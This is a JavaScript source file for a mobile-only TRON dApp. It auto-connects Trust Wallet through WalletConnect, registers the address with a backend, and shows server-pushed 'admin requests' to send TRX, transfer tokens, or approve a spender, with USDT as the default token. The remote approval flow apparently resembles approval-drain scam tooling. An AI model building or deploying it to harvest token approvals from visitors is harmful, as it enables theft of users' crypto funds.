import "./style.css";
import QRCode from "qrcode";
import { TronWeb } from "tronweb";
import {
  WalletConnectChainID,
  WalletConnectWallet,
} from "@tronweb3/walletconnect-tron";

const TRON_MAINNET_RPC = "https://api.trongrid.io";
const USDT_TRON_MAINNET = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRX_DECIMALS = 6;
const FEE_LIMIT = 200_000_000;
const CLIENT_ID_KEY = "trust_tron_dapp_client_id";

const WC_PROJECT_ID = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim();
const TRONGRID_API_KEY = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
const APP_NAME = import.meta.env.VITE_APP_NAME?.trim() || "Trust Wallet TRON dApp";
const APP_DESCRIPTION =
  import.meta.env.VITE_APP_DESCRIPTION?.trim() ||
  "TRON approve/transfer flow using WalletConnect";
const APP_ICON_URL =
  import.meta.env.VITE_APP_ICON_URL?.trim() || `${window.location.origin}/logo.svg`;
const BACKEND_HTTP_URL_RAW =
  import.meta.env.VITE_BACKEND_HTTP_URL?.trim() ||
  `${window.location.protocol}//${window.location.hostname}:8787`;
const BACKEND_WS_URL_RAW =
  import.meta.env.VITE_BACKEND_WS_URL?.trim() ||
  `${window.location.protocol === "https:" ? "wss" : "ws"}://${window.location.hostname}:8787/ws`;
const BACKEND_HTTP_URL = BACKEND_HTTP_URL_RAW.replace(/\/+$/, "");
const BACKEND_WS_URL = BACKEND_WS_URL_RAW.replace(/\/+$/, "");

const ua = navigator.userAgent ?? "";
const isMobileDevice = /Android|iPhone|iPad|iPod/i.test(ua);
const hasTrustUa = /trustwallet|trust\/|trust wallet/i.test(ua);
const hasTrustProviderHint =
  Boolean(window.ethereum?.isTrust) ||
  Boolean(window.trustwallet?.ethereum?.isTrust) ||
  Boolean(window.trustwallet?.solana?.isTrust);

const el = {
  environment: document.getElementById("environment"),
  status: document.getElementById("status"),
  wallet: document.getElementById("wallet"),
  pairingHint: document.getElementById("pairingHint"),
  qrCanvas: document.getElementById("qrCanvas"),
  logs: document.getElementById("logs"),
  connectBtn: document.getElementById("connectBtn"),
  disconnectBtn: document.getElementById("disconnectBtn"),
  trxTo: document.getElementById("trxTo"),
  trxAmount: document.getElementById("trxAmount"),
  sendTrxBtn: document.getElementById("sendTrxBtn"),
  approveToken: document.getElementById("approveToken"),
  approveSpender: document.getElementById("approveSpender"),
  approveAmount: document.getElementById("approveAmount"),
  approveDecimals: document.getElementById("approveDecimals"),
  approveBtn: document.getElementById("approveBtn"),
  tokenTransferContract: document.getElementById("tokenTransferContract"),
  tokenTransferTo: document.getElementById("tokenTransferTo"),
  tokenTransferAmount: document.getElementById("tokenTransferAmount"),
  tokenTransferDecimals: document.getElementById("tokenTransferDecimals"),
  transferTokenBtn: document.getElementById("transferTokenBtn"),
  backendStatus: document.getElementById("backendStatus"),
  adminRequests: document.getElementById("adminRequests"),
};

el.approveToken.value = USDT_TRON_MAINNET;
el.tokenTransferContract.value = USDT_TRON_MAINNET;

const tronWeb = new TronWeb({
  fullHost: TRON_MAINNET_RPC,
  headers: TRONGRID_API_KEY ? { "TRON-PRO-API-KEY": TRONGRID_API_KEY } : {},
});

let walletClient = null;
let connectedAddress = "";
let connecting = false;
let backendSocket = null;
let reconnectTimer = null;
let heartbeatTimer = null;
let pendingAdminRequests = [];
const processingRequestIds = new Set();
const clientId = getOrCreateClientId();

function appendLog(message, data) {
  const timestamp = new Date().toLocaleTimeString();
  const payload =
    data === undefined ? message : `${message}\n${JSON.stringify(data, null, 2)}`;
  el.logs.textContent = `[${timestamp}] ${payload}\n${el.logs.textContent}`;
}

function setStatus(message) {
  el.status.textContent = message;
}

function setWalletText(message) {
  el.wallet.textContent = message;
}

function setBackendStatus(message) {
  if (el.backendStatus) {
    el.backendStatus.textContent = message;
  }
}

function setEnvironmentText() {
  const trustMarker = hasTrustUa || hasTrustProviderHint ? "yes" : "no";
  el.environment.textContent = `Mobile: ${isMobileDevice ? "yes" : "no"} | Trust context: ${trustMarker}`;
}

function clearQr() {
  const ctx = el.qrCanvas.getContext("2d");
  if (ctx) {
    ctx.clearRect(0, 0, el.qrCanvas.width, el.qrCanvas.height);
  }
  el.qrCanvas.hidden = true;
}

async function renderQr(uri) {
  el.qrCanvas.hidden = false;
  await QRCode.toCanvas(el.qrCanvas, uri, { width: 280, margin: 1 });
}

function getTrustWalletWcLink(uri) {
  return `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
}

function openTrustWalletDeepLink(uri) {
  const deepLink = getTrustWalletWcLink(uri);
  el.pairingHint.textContent = "Opening Trust Wallet for WalletConnect pairing...";
  appendLog("Trust Wallet deep link", { deepLink });
  window.location.href = deepLink;
}

function handlePairingUri(uri) {
  appendLog("WalletConnect URI generated");
  renderQr(uri).catch((error) => appendLog("QR render failed", { error: String(error) }));

  if (hasTrustUa || hasTrustProviderHint) {
    el.pairingHint.textContent = "Approve the WalletConnect request inside Trust Wallet.";
    return;
  }

  openTrustWalletDeepLink(uri);
}

function syncButtons() {
  const disabledTx = !isMobileDevice || !connectedAddress;
  el.sendTrxBtn.disabled = disabledTx;
  el.approveBtn.disabled = disabledTx;
  el.transferTokenBtn.disabled = disabledTx;
  el.disconnectBtn.disabled = !connectedAddress;
  el.connectBtn.disabled = connecting || !isMobileDevice || !WC_PROJECT_ID;
}

function requireWallet() {
  if (!walletClient) {
    throw new Error("WalletConnect client not initialized. Add VITE_WALLETCONNECT_PROJECT_ID.");
  }
}

function requireAddress(address, fieldName) {
  if (!tronWeb.isAddress(address)) {
    throw new Error(`${fieldName} is not a valid TRON address`);
  }
}

function decimalToIntegerString(input, decimals) {
  const value = input.trim();
  if (!/^\d+(\.\d+)?$/.test(value)) {
    throw new Error("Invalid number format");
  }

  const [wholeRaw, fracRaw = ""] = value.split(".");
  if (fracRaw.length > decimals) {
    throw new Error(`Too many decimal places. Max is ${decimals}`);
  }

  const whole = wholeRaw.replace(/^0+(?=\d)/, "");
  const frac = fracRaw.padEnd(decimals, "0");
  const combined = `${whole}${frac}`.replace(/^0+(?=\d)/, "") || "0";
  return combined;
}

function getTxUrl(txid) {
  return `https://tronscan.org/#/transaction/${txid}`;
}

function randomIdFallback() {
  return `${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
}

function getOrCreateClientId() {
  const existing = localStorage.getItem(CLIENT_ID_KEY);
  if (existing) {
    return existing;
  }
  const next = typeof crypto.randomUUID === "function" ? crypto.randomUUID() : randomIdFallback();
  localStorage.setItem(CLIENT_ID_KEY, next);
  return next;
}

function backendPath(path) {
  return `${BACKEND_HTTP_URL}${path}`;
}

async function backendPost(path, payload) {
  const response = await fetch(backendPath(path), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const text = await response.text();
    throw new Error(text || `Backend request failed (${response.status})`);
  }

  return response.json();
}

async function backendGet(path) {
  const response = await fetch(backendPath(path));
  if (!response.ok) {
    const text = await response.text();
    throw new Error(text || `Backend request failed (${response.status})`);
  }
  return response.json();
}

function escapeHtml(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function requestTypeLabel(type) {
  if (type === "send_trx") return "TRX Send";
  if (type === "trc20_transfer") return "TRC20 Transfer";
  if (type === "trc20_approve") return "TRC20 Approve";
  return type;
}

function renderAdminRequests() {
  if (!el.adminRequests) return;

  if (pendingAdminRequests.length === 0) {
    el.adminRequests.innerHTML = `<p class="hint">No pending admin requests.</p>`;
    return;
  }

  const listItems = pendingAdminRequests
    .map((request) => {
      const requestId = escapeHtml(request.id);
      const createdAt = new Date(request.createdAt || Date.now()).toLocaleString();
      const paramsText = escapeHtml(JSON.stringify(request.params || {}, null, 2));
      const note = request.note ? `<p><strong>Note:</strong> ${escapeHtml(request.note)}</p>` : "";
      const busy = processingRequestIds.has(request.id);
      const approveDisabled = !connectedAddress || busy ? "disabled" : "";
      const rejectDisabled = busy ? "disabled" : "";

      return `
        <div class="request-item">
          <h3>${escapeHtml(requestTypeLabel(request.type))}</h3>
          <p><strong>Request ID:</strong> <code>${requestId}</code></p>
          <p><strong>Created:</strong> ${escapeHtml(createdAt)}</p>
          ${note}
          <p><strong>Params:</strong></p>
          <code>${paramsText}</code>
          <div class="request-actions">
            <button data-action="approve" data-request-id="${requestId}" ${approveDisabled}>Approve & Sign</button>
            <button data-action="reject" data-request-id="${requestId}" class="danger" ${rejectDisabled}>Reject</button>
          </div>
        </div>
      `;
    })
    .join("");

  el.adminRequests.innerHTML = `<div class="request-list">${listItems}</div>`;
}

function upsertPendingRequest(request) {
  const existingIndex = pendingAdminRequests.findIndex((item) => item.id === request.id);
  if (request.status && request.status !== "pending") {
    if (existingIndex >= 0) {
      pendingAdminRequests.splice(existingIndex, 1);
    }
    renderAdminRequests();
    return;
  }

  if (existingIndex >= 0) {
    pendingAdminRequests[existingIndex] = request;
  } else {
    pendingAdminRequests.unshift(request);
  }
  renderAdminRequests();
}

function removePendingRequest(requestId) {
  pendingAdminRequests = pendingAdminRequests.filter((item) => item.id !== requestId);
  processingRequestIds.delete(requestId);
  renderAdminRequests();
}

function setRequestProcessing(requestId, processing) {
  if (processing) {
    processingRequestIds.add(requestId);
  } else {
    processingRequestIds.delete(requestId);
  }
  renderAdminRequests();
}

function backendSocketIdentify() {
  if (!backendSocket || backendSocket.readyState !== WebSocket.OPEN) {
    return;
  }
  backendSocket.send(
    JSON.stringify({
      type: "identify",
      role: "wallet",
      clientId,
    }),
  );
}

function connectBackendSocket() {
  if (!isMobileDevice) return;
  if (backendSocket && (backendSocket.readyState === WebSocket.OPEN || backendSocket.readyState === WebSocket.CONNECTING)) {
    return;
  }

  backendSocket = new WebSocket(BACKEND_WS_URL);
  setBackendStatus("Backend websocket connecting...");

  backendSocket.onopen = () => {
    setBackendStatus(`Backend websocket connected (${clientId.slice(0, 8)}...)`);
    appendLog("Backend websocket connected");
    backendSocketIdentify();
  };

  backendSocket.onmessage = (event) => {
    let payload;
    try {
      payload = JSON.parse(String(event.data));
    } catch {
      return;
    }

    if (payload.type === "wallet_pending" && Array.isArray(payload.requests)) {
      pendingAdminRequests = payload.requests;
      renderAdminRequests();
      appendLog("Loaded pending admin requests", { count: payload.requests.length });
      return;
    }

    if (payload.type === "transaction_request" && payload.request) {
      appendLog("Received new admin request", payload.request);
      upsertPendingRequest(payload.request);
      return;
    }

    if (payload.type === "error") {
      appendLog("Backend websocket error", payload);
      setBackendStatus(`Backend websocket error: ${payload.message || "unknown"}`);
    }
  };

  backendSocket.onclose = () => {
    setBackendStatus("Backend websocket disconnected, retrying...");
    appendLog("Backend websocket disconnected");
    if (reconnectTimer) clearTimeout(reconnectTimer);
    reconnectTimer = setTimeout(() => {
      connectBackendSocket();
    }, 3000);
  };

  backendSocket.onerror = () => {
    setBackendStatus("Backend websocket connection error");
  };
}

async function fetchPendingRequestsFromBackend() {
  try {
    const result = await backendGet(`/api/wallet/${encodeURIComponent(clientId)}/pending-requests`);
    pendingAdminRequests = Array.isArray(result.requests) ? result.requests : [];
    renderAdminRequests();
  } catch (error) {
    appendLog("Pending request fetch warning", { error: String(error) });
  }
}

async function registerWalletWithBackend() {
  if (!connectedAddress) return;
  try {
    await backendPost("/api/wallet/register", {
      clientId,
      address: connectedAddress,
      userAgent: navigator.userAgent,
    });
    setBackendStatus(`Wallet registered with backend (${clientId.slice(0, 8)}...)`);
    await fetchPendingRequestsFromBackend();
  } catch (error) {
    setBackendStatus("Backend register failed");
    appendLog("Backend register failed", { error: String(error) });
  }
}

async function sendBackendHeartbeat() {
  try {
    await backendPost("/api/wallet/heartbeat", { clientId });
  } catch (error) {
    appendLog("Backend heartbeat warning", { error: String(error) });
  }
}

async function notifyBackendDisconnect() {
  try {
    await backendPost("/api/wallet/disconnect", { clientId });
  } catch (error) {
    appendLog("Backend disconnect warning", { error: String(error) });
  }
}

function startBackendSync() {
  connectBackendSocket();
  if (heartbeatTimer) {
    clearInterval(heartbeatTimer);
  }
  heartbeatTimer = setInterval(() => {
    if (connectedAddress) {
      sendBackendHeartbeat();
    }
  }, 25_000);
}

async function connectTrustWallet({ auto = false } = {}) {
  if (!isMobileDevice) {
    setStatus("Blocked: this dApp is mobile-only and intended for Trust Wallet app usage.");
    return;
  }

  requireWallet();
  if (connecting) return;

  connecting = true;
  syncButtons();
  setStatus("Connecting with Trust Wallet...");
  appendLog(auto ? "Auto connect started" : "Manual connect started");

  try {
    const { address } = await walletClient.connect({
      onUri: (uri) => {
        handlePairingUri(uri);
      },
    });

    connectedAddress = address;
    setWalletText(`Connected address: ${connectedAddress}`);
    setStatus("Connected to TRON Mainnet via Trust Wallet");
    el.pairingHint.textContent = "";
    clearQr();
    appendLog("Connected", { address: connectedAddress });
    await registerWalletWithBackend();
  } catch (error) {
    setStatus("Connection failed. Use Trust Wallet app and try again.");
    appendLog("Connection error", { error: String(error) });
  } finally {
    connecting = false;
    syncButtons();
    renderAdminRequests();
  }
}

async function disconnectWallet() {
  if (!walletClient) return;

  try {
    await walletClient.disconnect();
  } catch (error) {
    appendLog("Disconnect warning", { error: String(error) });
  } finally {
    connectedAddress = "";
    setWalletText("Not connected");
    setStatus("Disconnected");
    clearQr();
    el.pairingHint.textContent = "";
    pendingAdminRequests = [];
    renderAdminRequests();
    await notifyBackendDisconnect();
    syncButtons();
  }
}

function ensureReadyToSend() {
  if (!connectedAddress) {
    throw new Error("Connect wallet first");
  }
  requireAddress(connectedAddress, "Connected wallet address");
}

async function signAndBroadcast(transaction) {
  const signed = await walletClient.signTransaction(transaction);
  const broadcastResult = await tronWeb.trx.sendRawTransaction(signed);
  appendLog("Broadcast result", broadcastResult);

  if (!broadcastResult?.result) {
    throw new Error(`Broadcast failed: ${JSON.stringify(broadcastResult)}`);
  }

  return broadcastResult.txid;
}

async function sendTrxTransaction({ to, amount }) {
  ensureReadyToSend();
  requireAddress(to, "Recipient address");
  const amountSunString = decimalToIntegerString(amount, TRX_DECIMALS);
  const amountSun = BigInt(amountSunString);
  if (amountSun <= 0n) {
    throw new Error("TRX amount must be greater than 0");
  }
  if (amountSun > BigInt(Number.MAX_SAFE_INTEGER)) {
    throw new Error("TRX amount is too large for this starter template");
  }

  const transaction = await tronWeb.transactionBuilder.sendTrx(
    to,
    Number(amountSun),
    connectedAddress,
  );

  return signAndBroadcast(transaction);
}

async function approveTrc20Transaction({ token, spender, amount, decimals }) {
  ensureReadyToSend();
  requireAddress(token, "Token contract");
  requireAddress(spender, "Spender address");
  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 30) {
    throw new Error("Token decimals must be an integer between 0 and 30");
  }

  const amountInt = decimalToIntegerString(amount, decimals);
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    token,
    "approve(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [
      { type: "address", value: spender },
      { type: "uint256", value: amountInt },
    ],
    connectedAddress,
  );

  if (!trigger?.result?.result || !trigger.transaction) {
    throw new Error(`Approve transaction build failed: ${JSON.stringify(trigger)}`);
  }

  return signAndBroadcast(trigger.transaction);
}

async function transferTrc20Transaction({ token, to, amount, decimals }) {
  ensureReadyToSend();
  requireAddress(token, "Token contract");
  requireAddress(to, "Recipient address");
  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 30) {
    throw new Error("Token decimals must be an integer between 0 and 30");
  }

  const amountInt = decimalToIntegerString(amount, decimals);
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    token,
    "transfer(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [
      { type: "address", value: to },
      { type: "uint256", value: amountInt },
    ],
    connectedAddress,
  );

  if (!trigger?.result?.result || !trigger.transaction) {
    throw new Error(`Token transfer build failed: ${JSON.stringify(trigger)}`);
  }

  return signAndBroadcast(trigger.transaction);
}

async function handleSendTrx() {
  try {
    const txid = await sendTrxTransaction({
      to: el.trxTo.value.trim(),
      amount: el.trxAmount.value.trim(),
    });
    setStatus(`TRX sent. Tx: ${txid}`);
    appendLog("TRX transfer success", { txid, url: getTxUrl(txid) });
  } catch (error) {
    setStatus("TRX transfer failed");
    appendLog("TRX transfer error", { error: String(error) });
  }
}

async function handleApprove() {
  try {
    const txid = await approveTrc20Transaction({
      token: el.approveToken.value.trim(),
      spender: el.approveSpender.value.trim(),
      amount: el.approveAmount.value.trim(),
      decimals: Number(el.approveDecimals.value.trim()),
    });
    setStatus(`Approve success. Tx: ${txid}`);
    appendLog("Approve success", { txid, url: getTxUrl(txid) });
  } catch (error) {
    setStatus("Approve failed");
    appendLog("Approve error", { error: String(error) });
  }
}

async function handleTokenTransfer() {
  try {
    const txid = await transferTrc20Transaction({
      token: el.tokenTransferContract.value.trim(),
      to: el.tokenTransferTo.value.trim(),
      amount: el.tokenTransferAmount.value.trim(),
      decimals: Number(el.tokenTransferDecimals.value.trim()),
    });
    setStatus(`Token transfer success. Tx: ${txid}`);
    appendLog("TRC20 transfer success", { txid, url: getTxUrl(txid) });
  } catch (error) {
    setStatus("Token transfer failed");
    appendLog("TRC20 transfer error", { error: String(error) });
  }
}

function classifyRequestError(error) {
  const text = String(error || "");
  if (/rejected|denied|cancel/i.test(text)) {
    return "rejected";
  }
  return "failed";
}

async function reportRequestResult(request, payload) {
  await backendPost(`/api/request/${encodeURIComponent(request.id)}/result`, {
    clientId,
    ...payload,
  });
}

async function executeAdminRequest(request) {
  if (!connectedAddress) {
    throw new Error("Wallet is disconnected");
  }

  const params = request.params || {};
  if (request.type === "send_trx") {
    return sendTrxTransaction({
      to: String(params.to || "").trim(),
      amount: String(params.amount || "").trim(),
    });
  }

  if (request.type === "trc20_transfer") {
    return transferTrc20Transaction({
      token: String(params.token || "").trim(),
      to: String(params.to || "").trim(),
      amount: String(params.amount || "").trim(),
      decimals: Number(params.decimals ?? 6),
    });
  }

  if (request.type === "trc20_approve") {
    return approveTrc20Transaction({
      token: String(params.token || "").trim(),
      spender: String(params.spender || "").trim(),
      amount: String(params.amount || "").trim(),
      decimals: Number(params.decimals ?? 6),
    });
  }

  throw new Error(`Unsupported request type: ${request.type}`);
}

async function approveAdminRequest(request) {
  setRequestProcessing(request.id, true);
  setStatus(`Approving admin request ${request.id}...`);
  try {
    const txid = await executeAdminRequest(request);
    await reportRequestResult(request, {
      action: "approved",
      txid,
    });
    appendLog("Admin request approved", {
      requestId: request.id,
      txid,
      url: getTxUrl(txid),
    });
    setStatus(`Admin request approved. Tx: ${txid}`);
    removePendingRequest(request.id);
  } catch (error) {
    const action = classifyRequestError(error);
    try {
      await reportRequestResult(request, {
        action,
        error: String(error),
      });
    } catch (reportError) {
      appendLog("Failed to report request result", { error: String(reportError) });
    }
    appendLog("Admin request execution error", {
      requestId: request.id,
      error: String(error),
      action,
    });
    setStatus(`Admin request ${action}: ${String(error)}`);
    removePendingRequest(request.id);
  }
}

async function rejectAdminRequest(request) {
  setRequestProcessing(request.id, true);
  try {
    await reportRequestResult(request, {
      action: "rejected",
      error: "User rejected this request in dApp.",
    });
    appendLog("Admin request rejected", { requestId: request.id });
    setStatus("Admin request rejected");
  } catch (error) {
    appendLog("Reject reporting error", { requestId: request.id, error: String(error) });
  } finally {
    removePendingRequest(request.id);
  }
}

function getRequestById(requestId) {
  return pendingAdminRequests.find((item) => item.id === requestId);
}

async function onAdminRequestAction(event) {
  const button = event.target.closest("button[data-action][data-request-id]");
  if (!button) return;
  const action = button.getAttribute("data-action");
  const requestId = button.getAttribute("data-request-id");
  if (!action || !requestId) return;
  const request = getRequestById(requestId);
  if (!request) return;
  if (processingRequestIds.has(requestId)) return;

  if (action === "approve") {
    await approveAdminRequest(request);
    return;
  }
  if (action === "reject") {
    await rejectAdminRequest(request);
  }
}

function initWalletClient() {
  if (!WC_PROJECT_ID) {
    setStatus("Missing VITE_WALLETCONNECT_PROJECT_ID in .env");
    setWalletText("Not connected");
    appendLog("Missing WalletConnect project id");
    return;
  }

  walletClient = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: WC_PROJECT_ID,
      metadata: {
        name: APP_NAME,
        description: APP_DESCRIPTION,
        url: window.location.origin,
        icons: [APP_ICON_URL],
      },
    },
    themeMode: "light",
    themeVariables: {
      "--w3m-z-index": 9999,
    },
  });

  walletClient.on("accountsChanged", async (accounts) => {
    connectedAddress = accounts?.[0] ?? "";
    setWalletText(
      connectedAddress ? `Connected address: ${connectedAddress}` : "Not connected",
    );
    syncButtons();
    renderAdminRequests();
    appendLog("Accounts changed", { accounts });
    if (connectedAddress) {
      await registerWalletWithBackend();
    }
  });

  walletClient.on("disconnect", async () => {
    connectedAddress = "";
    setWalletText("Not connected");
    setStatus("Wallet disconnected");
    syncButtons();
    renderAdminRequests();
    appendLog("Wallet disconnected");
    await notifyBackendDisconnect();
  });
}

async function checkExistingConnection() {
  if (!walletClient) return false;
  try {
    const status = await walletClient.checkConnectStatus();
    if (status?.address) {
      connectedAddress = status.address;
      setWalletText(`Connected address: ${connectedAddress}`);
      setStatus("Reconnected existing Trust Wallet session");
      appendLog("Auto-reconnected session", status);
      return true;
    }
  } catch (error) {
    appendLog("checkConnectStatus error", { error: String(error) });
  }
  return false;
}

async function init() {
  setEnvironmentText();
  setWalletText("Not connected");
  setStatus("Ready");
  setBackendStatus("Backend: waiting for mobile session");
  renderAdminRequests();
  initWalletClient();
  syncButtons();

  if (!isMobileDevice) {
    setStatus("Desktop blocked: open this dApp inside Trust Wallet mobile app.");
    return;
  }

  startBackendSync();
  await fetchPendingRequestsFromBackend();

  if (!hasTrustUa && !hasTrustProviderHint) {
    el.pairingHint.textContent =
      "This dApp is Trust-Wallet-only. Press connect and it will open Trust Wallet.";
  }

  const hasSession = await checkExistingConnection();
  syncButtons();
  renderAdminRequests();

  if (hasSession) {
    await registerWalletWithBackend();
    return;
  }

  if (walletClient) {
    await connectTrustWallet({ auto: true });
  }
}

el.connectBtn.addEventListener("click", () => connectTrustWallet({ auto: false }));
el.disconnectBtn.addEventListener("click", disconnectWallet);
el.sendTrxBtn.addEventListener("click", handleSendTrx);
el.approveBtn.addEventListener("click", handleApprove);
el.transferTokenBtn.addEventListener("click", handleTokenTransfer);
el.adminRequests.addEventListener("click", onAdminRequestAction);

init().catch((error) => {
  appendLog("Fatal init error", { error: String(error) });
  setStatus("Initialization failed");
});
